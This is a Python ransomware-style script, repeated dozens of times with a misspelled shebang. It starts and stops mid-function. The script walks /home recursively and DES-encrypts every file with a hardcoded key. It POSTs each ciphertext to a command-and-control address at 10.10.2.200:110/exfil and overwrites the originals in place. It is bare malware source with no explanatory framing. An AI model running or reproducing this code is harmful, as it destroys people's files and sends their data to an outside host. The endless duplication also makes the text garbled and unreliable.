        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

